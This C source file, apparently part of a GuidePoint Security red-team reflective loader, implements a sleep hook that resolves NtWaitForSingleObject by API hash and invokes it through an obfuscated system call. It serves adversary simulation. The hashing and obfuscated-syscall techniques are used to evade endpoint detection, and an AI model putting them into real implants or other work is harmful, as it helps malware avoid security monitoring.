/**
 *
 * Reflective Loader
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation
 *
**/

#include "Common.h"

/* API Hashes */
#define H_API_NTWAITFORSINGLEOBJECT	0xe8ac0c3c /* NtWaitForSingleObject */

/* LIB Hashes */
#define H_LIB_NTDLL			0x1edab0ed /* ntdll.dll */	

/*!
 *
 * Purpose:
 *
 * Goes to sleep using NtWaitForSingleObject, and awaits
 * on the result.
 *
!*/

D_SEC( D ) VOID WINAPI Sleep_Hook( _In_ ULONG WaitTime )
{
	LARGE_INTEGER	Del;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Del, sizeof( Del ) );

	Del.QuadPart = -10000LL * WaitTime;
	PVOID Arg[]  = {
		C_PTR( NtCurrentThread() ),
		C_PTR( FALSE ),
		C_PTR( &Del )
	};
	ObfSystemCall( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTWAITFORSINGLEOBJECT ), Arg, ARRAYSIZE( Arg ) );

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Del, sizeof( Del ) );
}
